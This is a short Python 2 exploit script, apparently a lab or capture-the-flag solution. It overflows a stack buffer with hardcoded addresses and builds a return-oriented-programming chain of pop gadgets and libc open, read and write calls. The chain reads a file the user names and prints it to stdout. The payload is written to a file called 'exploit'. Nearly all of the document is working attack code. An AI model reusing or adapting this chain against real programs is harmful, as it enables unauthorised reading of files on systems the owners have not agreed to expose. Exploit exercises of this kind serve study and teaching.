import sys

def pack32(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(4, "\x00")
    return s

def pack64(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(8, "\x00")
    return s

bufaddr = 0x7ffffffedb10
retaddr = 0x7ffffffedb48

rsigdt = 0x004008c1 # Also pops 1 extra item to $r15
rdigdt = 0x004008c3
openaddr = 0x7fffff127030
readaddr = 0x7fffff127250
writeaddr = 0x7fffff1272b0

payload_len = (retaddr - bufaddr) + 3 * (6 * 8)

# Read the filename from attacker
# Must be null-terminated
print("What file do you want to read?")
filepath = raw_input() + '\x00'
# print(filepath, len(filepath))
assert(len(filepath) <= retaddr - bufaddr)

payload = filepath
payload += "A" * (retaddr - bufaddr - len(filepath))

# open, 6 * 8 bytes
payload += pack64(rsigdt)
payload += pack64(0)        # arg2: open() access mode
payload += pack64(0)        # dummy for rsigdt
payload += pack64(rdigdt)
payload += pack64(bufaddr)  # arg1: file path
payload += pack64(openaddr)

# read, 6 * 8  bytes
#   arg3 is $rdx, left as-is since its quite big alr
payload += pack64(rsigdt)
payload += pack64(bufaddr + payload_len)    # arg2: right below our payload
payload += pack64(0)                        # dummy for rsigdt
payload += pack64(rdigdt)
payload += pack64(3)                        # arg1: guessing the file descriptor is 3, second file opened
payload += pack64(readaddr)

# write, 6 * 8 bytes
#   arg3 is $rdx, left as-is since its quite big alr
payload += pack64(rsigdt)
payload += pack64(bufaddr + payload_len)    # arg2: right below our payload
payload += pack64(0)                        # dummy for rsigdt
payload += pack64(rdigdt)
payload += pack64(1)                        # arg1: stdout
payload += pack64(writeaddr)

print("Length of payload supposed to be: ", payload_len)
print("Length of payload is: ", len(payload))
assert(len(payload) == payload_len)

e = open("exploit", "w+")
e.write(payload)

i = open("input", "w+")
i.write("-1\n")
